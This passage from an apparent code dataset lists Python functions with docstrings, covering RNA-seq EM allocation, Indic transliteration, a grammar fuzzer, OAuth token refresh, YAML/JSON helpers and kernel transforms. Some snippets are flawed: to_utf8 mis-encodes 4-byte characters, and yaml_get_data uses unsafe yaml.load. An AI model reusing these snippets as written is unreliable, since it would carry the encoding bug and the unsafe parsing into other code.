            "def update_probability_at_read_level(self, model=3):\n        \"\"\"\n        Updates the probability of read origin at read level\n\n        :param model: Normalization model (1: Gene->Allele->Isoform, 2: Gene->Isoform->Allele, 3: Gene->Isoform*Allele, 4: Gene*Isoform*Allele)\n        :return: Nothing (as it performs in-place operations)\n        \"\"\"\n        self.probability.reset()  # reset to alignment incidence matrix\n        if model == 1:\n            self.probability.multiply(self.allelic_expression, axis=APM.Axis.READ)\n            self.probability.normalize_reads(axis=APM.Axis.HAPLOGROUP, grouping_mat=self.t2t_mat)\n            haplogroup_sum_mat = self.allelic_expression * self.t2t_mat\n            self.probability.multiply(haplogroup_sum_mat, axis=APM.Axis.READ)\n            self.probability.normalize_reads(axis=APM.Axis.GROUP, grouping_mat=self.t2t_mat)\n            self.probability.multiply(haplogroup_sum_mat.sum(axis=0), axis=APM.Axis.HAPLOTYPE)\n            self.probability.normalize_reads(axis=APM.Axis.READ)\n        elif model == 2:\n            self.probability.multiply(self.allelic_expression, axis=APM.Axis.READ)\n            self.probability.normalize_reads(axis=APM.Axis.LOCUS)\n            self.probability.multiply(self.allelic_expression.sum(axis=0), axis=APM.Axis.HAPLOTYPE)\n            self.probability.normalize_reads(axis=APM.Axis.GROUP, grouping_mat=self.t2t_mat)\n            self.probability.multiply((self.allelic_expression * self.t2t_mat).sum(axis=0), axis=APM.Axis.HAPLOTYPE)\n            self.probability.normalize_reads(axis=APM.Axis.READ)\n        elif model == 3:\n            self.probability.multiply(self.allelic_expression, axis=APM.Axis.READ)\n            self.probability.normalize_reads(axis=APM.Axis.GROUP, grouping_mat=self.t2t_mat)\n            self.probability.multiply((self.allelic_expression * self.t2t_mat).sum(axis=0), axis=APM.Axis.HAPLOTYPE)\n            self.probability.normalize_reads(axis=APM.Axis.READ)\n        elif model == 4:\n            self.probability.multiply(self.allelic_expression, axis=APM.Axis.READ)\n            self.probability.normalize_reads(axis=APM.Axis.READ)\n        else:\n            raise RuntimeError('The read normalization model should be 1, 2, 3, or 4.')"
        ],
        [
            "def run(self, model, tol=0.001, max_iters=999, verbose=True):\n        \"\"\"\n        Runs EM iterations\n\n        :param model: Normalization model (1: Gene->Allele->Isoform, 2: Gene->Isoform->Allele, 3: Gene->Isoform*Allele, 4: Gene*Isoform*Allele)\n        :param tol: Tolerance for termination\n        :param max_iters: Maximum number of iterations until termination\n        :param verbose: Display information on how EM is running\n        :return: Nothing (as it performs in-place operations)\n        \"\"\"\n        orig_err_states = np.seterr(all='raise')\n        np.seterr(under='ignore')\n        if verbose:\n            print\n            print \"Iter No  Time (hh:mm:ss)    Total change (TPM)  \"\n            print \"-------  ---------------  ----------------------\"\n        num_iters = 0\n        err_sum = 1000000.0\n        time0 = time.time()\n        target_err = 1000000.0 * tol\n        while err_sum > target_err and num_iters < max_iters:\n            prev_isoform_expression = self.get_allelic_expression().sum(axis=0)\n            prev_isoform_expression *= (1000000.0 / prev_isoform_expression.sum())\n            self.update_allelic_expression(model=model)\n            curr_isoform_expression = self.get_allelic_expression().sum(axis=0)\n            curr_isoform_expression *= (1000000.0 / curr_isoform_expression.sum())\n            err = np.abs(curr_isoform_expression - prev_isoform_expression)\n            err_sum = err.sum()\n            num_iters += 1\n            if verbose:\n                time1 = time.time()\n                delmin, s = divmod(int(time1 - time0), 60)\n                h, m = divmod(delmin, 60)\n                print \" %5d      %4d:%02d:%02d     %9.1f / 1000000\" % (num_iters, h, m, s, err_sum)"
        ],
        [
            "def report_read_counts(self, filename, grp_wise=False, reorder='as-is', notes=None):\n        \"\"\"\n        Exports expected read counts\n\n        :param filename: File name for output\n        :param grp_wise: whether the report is at isoform level or gene level\n        :param reorder: whether the report should be either 'decreasing' or 'increasing' order or just 'as-is'\n        :return: Nothing but the method writes a file\n        \"\"\"\n        expected_read_counts = self.probability.sum(axis=APM.Axis.READ)\n        if grp_wise:\n            lname = self.probability.gname\n            expected_read_counts = expected_read_counts * self.grp_conv_mat\n        else:\n            lname = self.probability.lname\n        total_read_counts = expected_read_counts.sum(axis=0)\n        if reorder == 'decreasing':\n            report_order = np.argsort(total_read_counts.flatten())\n            report_order = report_order[::-1]\n        elif reorder == 'increasing':\n            report_order = np.argsort(total_read_counts.flatten())\n        elif reorder == 'as-is':\n            report_order = np.arange(len(lname))  # report in the original locus order\n        cntdata = np.vstack((expected_read_counts, total_read_counts))\n        fhout = open(filename, 'w')\n        fhout.write(\"locus\\t\" + \"\\t\".join(self.probability.hname) + \"\\ttotal\")\n        if notes is not None:\n            fhout.write(\"\\tnotes\")\n        fhout.write(\"\\n\")\n        for locus_id in report_order:\n            lname_cur = lname[locus_id]\n            fhout.write(\"\\t\".join([lname_cur] + map(str, cntdata[:, locus_id].ravel())))\n            if notes is not None:\n                fhout.write(\"\\t%s\" % notes[lname_cur])\n            fhout.write(\"\\n\")\n        fhout.close()"
        ],
        [
            "def report_depths(self, filename, tpm=True, grp_wise=False, reorder='as-is', notes=None):\n        \"\"\"\n        Exports expected depths\n\n        :param filename: File name for output\n        :param grp_wise: whether the report is at isoform level or gene level\n        :param reorder: whether the report should be either 'decreasing' or 'increasing' order or just 'as-is'\n        :return: Nothing but the method writes a file\n        \"\"\"\n        if grp_wise:\n            lname = self.probability.gname\n            depths = self.allelic_expression * self.grp_conv_mat\n        else:\n            lname = self.probability.lname\n            depths = self.allelic_expression\n        if tpm:\n            depths *= (1000000.0 / depths.sum())\n        total_depths = depths.sum(axis=0)\n        if reorder == 'decreasing':\n            report_order = np.argsort(total_depths.flatten())\n            report_order = report_order[::-1]\n        elif reorder == 'increasing':\n            report_order = np.argsort(total_depths.flatten())\n        elif reorder == 'as-is':\n            report_order = np.arange(len(lname))  # report in the original locus order\n        cntdata = np.vstack((depths, total_depths))\n        fhout = open(filename, 'w')\n        fhout.write(\"locus\\t\" + \"\\t\".join(self.probability.hname) + \"\\ttotal\")\n        if notes is not None:\n            fhout.write(\"\\tnotes\")\n        fhout.write(\"\\n\")\n        for locus_id in report_order:\n            lname_cur = lname[locus_id]\n            fhout.write(\"\\t\".join([lname_cur] + map(str, cntdata[:, locus_id].ravel())))\n            if notes is not None:\n                fhout.write(\"\\t%s\" % notes[lname_cur])\n            fhout.write(\"\\n\")\n        fhout.close()"
        ],
        [
            "def export_posterior_probability(self, filename, title=\"Posterior Probability\"):\n        \"\"\"\n        Writes the posterior probability of read origin\n\n        :param filename: File name for output\n        :param title: The title of the posterior probability matrix\n        :return: Nothing but the method writes a file in EMASE format (PyTables)\n        \"\"\"\n        self.probability.save(h5file=filename, title=title)"
        ],
        [
            "def print_read(self, rid):\r\n        \"\"\"\r\n        Prints nonzero rows of the read wanted\r\n\r\n        \"\"\"\r\n        if self.rname is not None:\r\n            print self.rname[rid]\r\n            print '--'\r\n        r = self.get_read_data(rid)\r\n        aligned_loci = np.unique(r.nonzero()[1])\r\n        for locus in aligned_loci:\r\n            nzvec = r[:, locus].todense().transpose()[0].A.flatten()\r\n            if self.lname is not None:\r\n                print self.lname[locus],\r\n            else:\r\n                print locus,\r\n            print nzvec"
        ],
        [
            "def _roman(data, scheme_map, **kw):\n  \"\"\"Transliterate `data` with the given `scheme_map`. This function is used\n  when the source scheme is a Roman scheme.\n\n  :param data: the data to transliterate\n  :param scheme_map: a dict that maps between characters in the old scheme\n                     and characters in the new scheme\n  \"\"\"\n  vowels = scheme_map.vowels\n  marks = scheme_map.marks\n  virama = scheme_map.virama\n  consonants = scheme_map.consonants\n  non_marks_viraama = scheme_map.non_marks_viraama\n  max_key_length_from_scheme = scheme_map.max_key_length_from_scheme\n  to_roman = scheme_map.to_scheme.is_roman\n\n  togglers = kw.pop('togglers', set())\n  suspend_on = kw.pop('suspend_on', set())\n  suspend_off = kw.pop('suspend_off', set())\n  if kw:\n    raise TypeError('Unexpected keyword argument %s' % list(kw.keys())[0])\n\n  buf = []\n  i = 0\n  had_consonant = found = False\n  len_data = len(data)\n  append = buf.append\n\n  # If true, don't transliterate. The toggle token is discarded.\n  toggled = False\n  # If true, don't transliterate. The suspend token is retained.\n  # `suspended` overrides `toggled`.\n  suspended = False\n\n  while i <= len_data:\n    # The longest token in the source scheme has length `max_key_length_from_scheme`. Iterate\n    # over `data` while taking `max_key_length_from_scheme` characters at a time. If we don`t\n    # find the character group in our scheme map, lop off a character and\n    # try again.\n    #\n    # If we've finished reading through `data`, then `token` will be empty\n    # and the loop below will be skipped.\n    token = data[i:i + max_key_length_from_scheme]\n\n    while token:\n      if token in togglers:\n        toggled = not toggled\n        i += 2  # skip over the token\n        found = True  # force the token to fill up again\n        break\n\n      if token in suspend_on:\n        suspended = True\n      elif token in suspend_off:\n        suspended = False\n\n      if toggled or suspended:\n        token = token[:-1]\n        continue\n\n      # Catch the pattern CV, where C is a consonant and V is a vowel.\n      # V should be rendered as a vowel mark, a.k.a. a \"dependent\"\n      # vowel. But due to the nature of Brahmic scripts, 'a' is implicit\n      # and has no vowel mark. If we see 'a', add nothing.\n      if had_consonant and token in vowels:\n        mark = marks.get(token, '')\n        if mark:\n          append(mark)\n        elif to_roman:\n          append(vowels[token])\n        found = True\n\n      # Catch any non_marks_viraama character, including consonants, punctuation,\n      # and regular vowels. Due to the implicit 'a', we must explicitly\n      # end any lingering consonants before we can handle the current\n      # token.\n      elif token in non_marks_viraama:\n        if had_consonant:\n          append(virama[''])\n        append(non_marks_viraama[token])\n        found = True\n\n      if found:\n        had_consonant = token in consonants\n        i += len(token)\n        break\n      else:\n        token = token[:-1]\n\n    # We've exhausted the token; this must be some other character. Due to\n    # the implicit 'a', we must explicitly end any lingering consonants\n    # before we can handle the current token.\n    if not found:\n      if had_consonant:\n        append(virama[''])\n      if i < len_data:\n        append(data[i])\n        had_consonant = False\n      i += 1\n\n    found = False\n\n  return ''.join(buf)"
        ],
        [
            "def _brahmic(data, scheme_map, **kw):\n  \"\"\"Transliterate `data` with the given `scheme_map`. This function is used\n  when the source scheme is a Brahmic scheme.\n\n  :param data: the data to transliterate\n  :param scheme_map: a dict that maps between characters in the old scheme\n                     and characters in the new scheme\n  \"\"\"\n  if scheme_map.from_scheme.name == northern.GURMUKHI:\n    data = northern.GurmukhiScheme.replace_tippi(text=data) \n  marks = scheme_map.marks\n  virama = scheme_map.virama\n  consonants = scheme_map.consonants\n  non_marks_viraama = scheme_map.non_marks_viraama\n  to_roman = scheme_map.to_scheme.is_roman\n  max_key_length_from_scheme = scheme_map.max_key_length_from_scheme\n\n  buf = []\n  i = 0\n  to_roman_had_consonant = found = False\n  append = buf.append\n  # logging.debug(pprint.pformat(scheme_map.consonants))\n\n  # We dont just translate each brAhmic character one after another in order to prefer concise transliterations when possible - for example \u091c\u094d\u091e -> jn in optitrans rather than j~n.\n  while i <= len(data):\n    # The longest token in the source scheme has length `max_key_length_from_scheme`. Iterate\n    # over `data` while taking `max_key_length_from_scheme` characters at a time. If we don`t\n    # find the character group in our scheme map, lop off a character and\n    # try again.\n    #\n    # If we've finished reading through `data`, then `token` will be empty\n    # and the loop below will be skipped.\n    token = data[i:i + max_key_length_from_scheme]\n\n    while token:\n      if len(token) == 1:\n        if token in marks:\n          append(marks[token])\n          found = True\n        elif token in virama:\n          append(virama[token])\n          found = True\n        else:\n          if to_roman_had_consonant:\n            append('a')\n          append(non_marks_viraama.get(token, token))\n          found = True\n      else:\n        if token in non_marks_viraama:\n          if to_roman_had_consonant:\n            append('a')\n          append(non_marks_viraama.get(token))\n          found = True\n\n      if found:\n        to_roman_had_consonant = to_roman and token in consonants\n        i += len(token)\n        break        \n      else:\n        token = token[:-1]\n\n    # Continuing the outer while loop.\n    # We've exhausted the token; this must be some other character. Due to\n    # the implicit 'a', we must explicitly end any lingering consonants\n    # before we can handle the current token.\n    if not found:\n      if to_roman_had_consonant:\n        append(next(iter(virama.values())))\n      if i < len(data):\n        append(data[i])\n        to_roman_had_consonant = False\n      i += 1\n\n    found = False\n\n  if to_roman_had_consonant:\n    append('a')\n  return ''.join(buf)"
        ],
        [
            "def detect(text):\n  \"\"\"Detect the input's transliteration scheme.\n\n    :param text: some text data, either a `unicode` or a `str` encoded\n                 in UTF-8.\n    \"\"\"\n  if sys.version_info < (3, 0):\n    # Verify encoding\n    try:\n      text = text.decode('utf-8')\n    except UnicodeError:\n      pass\n\n  # Brahmic schemes are all within a specific range of code points.\n  for L in text:\n    code = ord(L)\n    if code >= BRAHMIC_FIRST_CODE_POINT:\n      for name, start_code in BLOCKS:\n        if start_code <= code <= BRAHMIC_LAST_CODE_POINT:\n          return name\n\n  # Romanizations\n  if Regex.IAST_OR_KOLKATA_ONLY.search(text):\n    if Regex.KOLKATA_ONLY.search(text):\n      return Scheme.Kolkata\n    else:\n      return Scheme.IAST\n\n  if Regex.ITRANS_ONLY.search(text):\n    return Scheme.ITRANS\n\n  if Regex.SLP1_ONLY.search(text):\n    return Scheme.SLP1\n\n  if Regex.VELTHUIS_ONLY.search(text):\n    return Scheme.Velthuis\n\n  if Regex.ITRANS_OR_VELTHUIS_ONLY.search(text):\n    return Scheme.ITRANS\n\n  return Scheme.HK"
        ],
        [
            "def _setup():\r\n    \"\"\"Add a variety of default schemes.\"\"\"\r\n    s = str.split\r\n    if sys.version_info < (3, 0):\r\n        # noinspection PyUnresolvedReferences\r\n        s = unicode.split\r\n\r\n    def pop_all(some_dict, some_list):\r\n        for scheme in some_list:\r\n            some_dict.pop(scheme)\r\n    global SCHEMES\r\n    SCHEMES = copy.deepcopy(sanscript.SCHEMES)\r\n    pop_all(SCHEMES, [sanscript.ORIYA, sanscript.BENGALI, sanscript.GUJARATI])\r\n    SCHEMES[HK].update({\r\n        'vowels': s(\"\"\"a A i I u U R RR lR lRR E ai O au\"\"\") + s(\"\"\"e o\"\"\"),\r\n        'marks': s(\"\"\"A i I u U R RR lR lRR E ai O au\"\"\") + s(\"\"\"e o\"\"\"),\r\n        'consonants': sanscript.SCHEMES[HK]['consonants'] + s(\"\"\"n2 r2 zh\"\"\")\r\n    })\r\n    SCHEMES[ITRANS].update({\r\n        'vowels': s(\"\"\"a A i I u U R RR LLi LLI E ai O au\"\"\") + s(\"\"\"e o\"\"\"),\r\n        'marks': s(\"\"\"A i I u U R RR LLi LLI E ai O au\"\"\") + s(\"\"\"e o\"\"\"),\r\n        'consonants': sanscript.SCHEMES[ITRANS]['consonants'] + s(\"\"\"n2 r2 zh\"\"\")\r\n    })\r\n    pop_all(SCHEMES[ITRANS].synonym_map, s(\"\"\"e o\"\"\"))\r\n    SCHEMES[OPTITRANS].update({\r\n        'vowels': s(\"\"\"a A i I u U R RR LLi LLI E ai O au\"\"\") + s(\"\"\"e o\"\"\"),\r\n        'marks': s(\"\"\"A i I u U R RR LLi LLI E ai O au\"\"\") + s(\"\"\"e o\"\"\"),\r\n        'consonants': sanscript.SCHEMES[OPTITRANS]['consonants'] + s(\"\"\"n2 r2 zh\"\"\")\r\n    })\r\n    pop_all(SCHEMES[OPTITRANS].synonym_map, s(\"\"\"e o\"\"\"))"
        ],
        [
            "def to_utf8(y):\n    \"\"\"\n    converts an array of integers to utf8 string\n    \"\"\"\n\n    out = []\n\n    for x in y:\n\n        if x < 0x080:\n            out.append(x)\n        elif x < 0x0800:\n            out.append((x >> 6) | 0xC0)\n            out.append((x & 0x3F) | 0x80)\n        elif x < 0x10000:\n            out.append((x >> 12) | 0xE0)\n            out.append(((x >> 6) & 0x3F) | 0x80)\n            out.append((x & 0x3F) | 0x80)\n        else:\n            out.append((x >> 18) | 0xF0)\n            out.append((x >> 12) & 0x3F)\n            out.append(((x >> 6) & 0x3F) | 0x80)\n            out.append((x & 0x3F) | 0x80)\n\n    return ''.join(map(chr, out))"
        ],
        [
            "def set_script(self, i):\n        \"\"\"\n        set the value of delta to reflect the current codepage\n        \n        \"\"\"\n\n        if i in range(1, 10):\n            n = i - 1\n        else:\n            raise IllegalInput(\"Invalid Value for ATR %s\" % (hex(i)))\n\n        if n > -1: # n = -1 is the default script ..\n            self.curr_script = n\n            self.delta = n * DELTA\n        \n        return"
        ],
        [
            "def _unrecognised(chr):\n    \"\"\" Handle unrecognised characters. \"\"\"\n    if options['handleUnrecognised'] == UNRECOGNISED_ECHO:\n        return chr\n    elif options['handleUnrecognised'] == UNRECOGNISED_SUBSTITUTE:\n        return options['substituteChar']\n    else:\n        raise (KeyError, chr)"
        ],
        [
            "def _equivalent(self, char, prev, next, implicitA):\n        \"\"\" Transliterate a Latin character equivalent to Devanagari.\n        \n        Add VIRAMA for ligatures.\n        Convert standalone to dependent vowels.\n        \n        \"\"\"\n        result = []\n        if char.isVowel == False:\n            result.append(char.chr)\n            if char.isConsonant \\\n            and ((next is not None and next.isConsonant) \\\n            or next is None): \n                result.append(DevanagariCharacter._VIRAMA)\n        else:\n            if prev is None or prev.isConsonant == False:\n                result.append(char.chr)\n            else:\n                if char._dependentVowel is not None:\n                    result.append(char._dependentVowel)\n        return result"
        ],
        [
            "def from_devanagari(self, data):\n        \"\"\"A convenience method\"\"\"\n        from indic_transliteration import sanscript\n        return sanscript.transliterate(data=data, _from=sanscript.DEVANAGARI, _to=self.name)"
        ],
        [
            "def generate(grammar=None, num=1, output=sys.stdout, max_recursion=10, seed=None):\n    \"\"\"Load and generate ``num`` number of top-level rules from the specified grammar.\n\n    :param list grammar: The grammar file to load and generate data from\n    :param int num: The number of times to generate data\n    :param output: The output destination (an open, writable stream-type object. default=``sys.stdout``)\n    :param int max_recursion: The maximum reference-recursion when generating data (default=``10``)\n    :param int seed: The seed to initialize the PRNG with. If None, will not initialize it.\n    \"\"\"\n    if seed is not None:\n        gramfuzz.rand.seed(seed)\n\n    fuzzer = gramfuzz.GramFuzzer()\n    fuzzer.load_grammar(grammar)\n\n    cat_group = os.path.basename(grammar).replace(\".py\", \"\")\n\n    results = fuzzer.gen(cat_group=cat_group, num=num, max_recursion=max_recursion)\n    for res in results:\n        output.write(res)"
        ],
        [
            "def build(self, pre=None, shortest=False):\n        \"\"\"Build the ``Quote`` instance\n\n        :param list pre: The prerequisites list\n        :param bool shortest: Whether or not the shortest reference-chain (most minimal) version of the field should be generated.\n        \"\"\"\n        res = super(Q, self).build(pre, shortest=shortest)\n\n        if self.escape:\n            return repr(res)\n        elif self.html_js_escape:\n            return (\"'\" + res.encode(\"string_escape\").replace(\"<\", \"\\\\x3c\").replace(\">\", \"\\\\x3e\") + \"'\")\n        else:\n            return \"\".join([self.quote, res, self.quote])"
        ],
        [
            "def make_present_participles(verbs):\n    \"\"\"Make the list of verbs into present participles\n\n    E.g.:\n\n        empower -> empowering\n        drive -> driving\n    \"\"\"\n    res = []\n    for verb in verbs:\n        parts = verb.split()\n        if parts[0].endswith(\"e\"):\n            parts[0] = parts[0][:-1] + \"ing\"\n        else:\n            parts[0] = parts[0] + \"ing\"\n        res.append(\" \".join(parts))\n    return res"
        ],
        [
            "def clear_sent_messages(self, offset=None):\n        \"\"\" Deletes sent MailerMessage records \"\"\"\n        if offset is None:\n            offset = getattr(settings, 'MAILQUEUE_CLEAR_OFFSET', defaults.MAILQUEUE_CLEAR_OFFSET)\n\n        if type(offset) is int:\n            offset = datetime.timedelta(hours=offset)\n\n        delete_before = timezone.now() - offset\n        self.filter(sent=True, last_attempt__lte=delete_before).delete()"
        ],
        [
            "def _loadNamelistIncludes(item, unique_glyphs, cache):\n  \"\"\"Load the includes of an encoding Namelist files.\n\n  This is an implementation detail of readNamelist.\n  \"\"\"\n  includes = item[\"includes\"] = []\n  charset = item[\"charset\"] = set() | item[\"ownCharset\"]\n\n  noCharcode = item[\"noCharcode\"] = set() | item[\"ownNoCharcode\"]\n\n  dirname =  os.path.dirname(item[\"fileName\"])\n  for include in item[\"header\"][\"includes\"]:\n    includeFile = os.path.join(dirname, include)\n    try:\n      includedItem = readNamelist(includeFile, unique_glyphs, cache)\n    except NamelistRecursionError:\n      continue\n    if includedItem in includes:\n      continue\n    includes.append(includedItem)\n    charset |= includedItem[\"charset\"]\n    noCharcode |= includedItem[\"ownNoCharcode\"]\n  return item"
        ],
        [
            "def __readNamelist(cache, filename, unique_glyphs):\n  \"\"\"Return a dict with the data of an encoding Namelist file.\n\n  This is an implementation detail of readNamelist.\n  \"\"\"\n  if filename in cache:\n    item = cache[filename]\n  else:\n    cps, header, noncodes = parseNamelist(filename)\n    item = {\n      \"fileName\": filename\n    , \"ownCharset\": cps\n    , \"header\": header\n    , \"ownNoCharcode\": noncodes\n    , \"includes\": None # placeholder\n    , \"charset\": None # placeholder\n    , \"noCharcode\": None\n    }\n    cache[filename] = item\n\n  if unique_glyphs or item[\"charset\"] is not None:\n    return item\n\n  # full-charset/includes are requested and not cached yet\n  _loadNamelistIncludes(item, unique_glyphs, cache)\n  return item"
        ],
        [
            "def _readNamelist(currentlyIncluding, cache, namFilename, unique_glyphs):\n  \"\"\" Detect infinite recursion and prevent it.\n\n  This is an implementation detail of readNamelist.\n\n  Raises NamelistRecursionError if namFilename is in the process of being included\n  \"\"\"\n  # normalize\n  filename = os.path.abspath(os.path.normcase(namFilename))\n  if filename in currentlyIncluding:\n    raise NamelistRecursionError(filename)\n  currentlyIncluding.add(filename)\n  try:\n    result = __readNamelist(cache, filename, unique_glyphs)\n  finally:\n    currentlyIncluding.remove(filename)\n  return result"
        ],
        [
            "def codepointsInNamelist(namFilename, unique_glyphs=False, cache=None):\n  \"\"\"Returns the set of codepoints contained in a given Namelist file.\n\n  This is a replacement CodepointsInSubset and implements the \"#$ include\"\n  header format.\n\n  Args:\n    namFilename: The path to the  Namelist file.\n    unique_glyphs: Optional, whether to only include glyphs unique to subset.\n  Returns:\n    A set containing the glyphs in the subset.\n  \"\"\"\n  key = 'charset' if not unique_glyphs else 'ownCharset'\n\n  internals_dir = os.path.dirname(os.path.abspath(__file__))\n  target = os.path.join(internals_dir, namFilename)\n  result = readNamelist(target, unique_glyphs, cache)\n  return result[key]"
        ],
        [
            "def get_orthographies(self, _library=library):\n        ''' Returns list of CharsetInfo about supported orthographies '''\n        results = []\n        for charset in _library.charsets:\n            if self._charsets:\n                cn = getattr(charset, 'common_name', False)\n                abbr = getattr(charset, 'abbreviation', False)\n                nn = getattr(charset, 'short_name', False)\n                naive = getattr(charset, 'native_name', False)\n\n                if cn and cn.lower() in self._charsets:\n                    results.append(charset)\n\n                elif nn and nn.lower() in self._charsets:\n                    results.append(charset)\n\n                elif naive and naive.lower() in self._charsets:\n                    results.append(charset)\n\n                elif abbr and abbr.lower() in self._charsets:\n                    results.append(charset)\n            else:\n                results.append(charset)\n\n        for result in results:\n            yield CharsetInfo(self, result)"
        ],
        [
            "def generate_oauth2_headers(self):\n        \"\"\"Generates header for oauth2\n        \"\"\"\n        encoded_credentials = base64.b64encode(('{0}:{1}'.format(self.consumer_key,self.consumer_secret)).encode('utf-8'))\n        headers={\n            'Authorization':'Basic {0}'.format(encoded_credentials.decode('utf-8')),\n            'Content-Type': 'application/x-www-form-urlencoded'\n        }\n\n        return headers"
        ],
        [
            "def oauth2_access_parser(self, raw_access):\n        \"\"\"Parse oauth2 access\n        \"\"\"\n        parsed_access = json.loads(raw_access.content.decode('utf-8'))\n        self.access_token = parsed_access['access_token']\n        self.token_type = parsed_access['token_type']\n        self.refresh_token = parsed_access['refresh_token']\n        self.guid = parsed_access['xoauth_yahoo_guid']\n\n        credentials = {\n            'access_token': self.access_token,\n            'token_type': self.token_type,\n            'refresh_token': self.refresh_token,\n            'guid': self.guid\n        }\n        \n        return credentials"
        ],
        [
            "def refresh_access_token(self,):\n        \"\"\"Refresh access token\n        \"\"\"\n        logger.debug(\"REFRESHING TOKEN\")\n        self.token_time = time.time()\n        credentials = {\n            'token_time': self.token_time\n        }\n\n        if self.oauth_version == 'oauth1':\n            self.access_token, self.access_token_secret = self.oauth.get_access_token(self.access_token, self.access_token_secret, params={\"oauth_session_handle\": self.session_handle})\n            credentials.update({\n                'access_token': self.access_token,\n                'access_token_secret': self.access_token_secret,\n                'session_handle': self.session_handle,\n                'token_time': self.token_time\n            })\n        else:\n            headers = self.generate_oauth2_headers()\n\n            raw_access = self.oauth.get_raw_access_token(data={\"refresh_token\": self.refresh_token, 'redirect_uri': self.callback_uri,'grant_type':'refresh_token'}, headers=headers)\n            credentials.update(self.oauth2_access_parser(raw_access))            \n\n        return credentials"
        ],
        [
            "def get_data(filename):\n    \"\"\"Calls right function according to file extension\n    \"\"\"\n    name, ext = get_file_extension(filename)\n    func = json_get_data if ext == '.json' else yaml_get_data\n    return func(filename)"
        ],
        [
            "def write_data(data, filename):\n    \"\"\"Call right func to save data according to file extension\n    \"\"\"\n    name, ext = get_file_extension(filename)\n    func = json_write_data if ext == '.json' else yaml_write_data\n    return func(data, filename)"
        ],
        [
            "def json_write_data(json_data, filename):\n    \"\"\"Write json data into a file\n    \"\"\"\n    with open(filename, 'w') as fp:\n        json.dump(json_data, fp, indent=4, sort_keys=True, ensure_ascii=False)\n        return True\n    return False"
        ],
        [
            "def json_get_data(filename):\n    \"\"\"Get data from json file\n    \"\"\"\n    with open(filename) as fp:\n        json_data = json.load(fp)\n        return json_data\n\n    return False"
        ],
        [
            "def yaml_get_data(filename):\n    \"\"\"Get data from .yml file\n    \"\"\"\n    with open(filename, 'rb') as fd:\n        yaml_data = yaml.load(fd)\n        return yaml_data\n    return False"
        ],
        [
            "def yaml_write_data(yaml_data, filename):\n    \"\"\"Write data into a .yml file\n    \"\"\"\n    with open(filename, 'w') as fd:\n        yaml.dump(yaml_data, fd, default_flow_style=False)\n        return True\n\n    return False"
        ],
        [
            "def transform(self, X):\n        '''\n        Turns distances into RBF values.\n\n        Parameters\n        ----------\n        X : array\n            The raw pairwise distances.\n\n        Returns\n        -------\n        X_rbf : array of same shape as X\n            The distances in X passed through the RBF kernel.\n        '''\n        X = check_array(X)\n        X_rbf = np.empty_like(X) if self.copy else X\n\n        X_in = X\n        if not self.squared:\n            np.power(X_in, 2, out=X_rbf)\n            X_in = X_rbf\n\n        if self.scale_by_median:\n            scale = self.median_ if self.squared else self.median_ ** 2\n            gamma = self.gamma * scale\n        else:\n            gamma = self.gamma\n        np.multiply(X_in, -gamma, out=X_rbf)\n\n        np.exp(X_rbf, out=X_rbf)\n        return X_rbf"
        ],
        [
            "def fit(self, X, y=None):\n        '''\n        Learn the linear transformation to clipped eigenvalues.\n\n        Note that if min_eig isn't zero and any of the original eigenvalues\n        were exactly zero, this will leave those eigenvalues as zero.\n\n        Parameters\n        ----------\n        X : array, shape [n, n]\n            The *symmetric* input similarities. If X is asymmetric, it will be\n            treated as if it were symmetric based on its lower-triangular part.\n        '''\n        n = X.shape[0]\n        if X.shape != (n, n):\n            raise TypeError(\"Input must be a square matrix.\")\n\n        # TODO: only get negative eigs somehow?\n        memory = get_memory(self.memory)\n        vals, vecs = memory.cache(scipy.linalg.eigh, ignore=['overwrite_a'])(\n            X, overwrite_a=not self.copy)\n        vals = vals.reshape(-1, 1)\n\n        if self.min_eig == 0:\n            inner = vals > self.min_eig\n        else:\n            with np.errstate(divide='ignore'):\n                inner = np.where(vals >= self.min_eig, 1,\n                                 np.where(vals == 0, 0, self.min_eig / vals))\n\n        self.clip_ = np.dot(vecs, inner * vecs.T)\n        return self"
        ],
        [
            "def fit(self, X, y=None):\n        '''\n        Learn the linear transformation to flipped eigenvalues.\n\n        Parameters\n        ----------\n        X : array, shape [n, n]\n            The *symmetric* input similarities. If X is asymmetric, it will be\n            treated as if it were symmetric based on its lower-triangular part.\n        '''\n        n = X.shape[0]\n        if X.shape != (n, n):\n            raise TypeError(\"Input must be a square matrix.\")\n\n        # TODO: only get negative eigs somehow?\n        memory = get_memory(self.memory)\n        vals, vecs = memory.cache(scipy.linalg.eigh, ignore=['overwrite_a'])(\n            X, overwrite_a=not self.copy)\n        vals = vals[:, None]\n\n        self.flip_ = np.dot(vecs, np.sign(vals) * vecs.T)\n        return self"
        ],
        [
            "def transform(self, X):\n        '''\n        Transforms X according to the linear transformation corresponding to\n        flipping the input eigenvalues.\n\n        Parameters\n        ----------\n        X : array, shape [n_test, n]\n            The test similarities to training points.\n\n        Returns\n        -------\n        Xt : array, shape [n_test, n]\n            The transformed test similarites to training points.\n        '''\n        n = self.flip_.shape[0]\n        if X.ndim != 2 or X.shape[1] != n:\n            msg = \"X should have {} columns, the number of samples at fit time\"\n            raise TypeError(msg.format(self.flip_.shape[0]))\n        return np.dot(X, self.flip_)"
        ],
        [
            "def fit_transform(self, X, y=None):\n        '''\n        Flips the negative eigenvalues of X.\n\n        Parameters\n        ----------\n        X : array, shape [n, n]\n            The *symmetric* input similarities. If X is asymmetric, it will be\n            treated as if it were symmetric based on its lower-triangular part.\n\n        Returns\n        -------\n        Xt : array, shape [n, n]\n            The transformed training similarities.\n        '''\n        n = X.shape[0]\n        if X.shape != (n, n):\n            raise TypeError(\"Input must be a square matrix.\")\n\n        memory = get_memory(self.memory)\n        discard_X = not self.copy and self.negatives_likely\n        vals, vecs = memory.cache(scipy.linalg.eigh, ignore=['overwrite_a'])(\n            X, overwrite_a=discard_X)\n        vals = vals[:, None]\n\n        self.clip_ = np.dot(vecs, np.sign(vals) * vecs.T)\n\n        if discard_X or vals[0, 0] < 0:\n            del X\n            np.abs(vals, out=vals)\n            X = np.dot(vecs, vals * vecs.T)\n            del vals, vecs\n\n            # should be symmetric, but make sure because floats\n            X = Symmetrize(copy=False).fit_transform(X)\n        return X"
        ],
        [
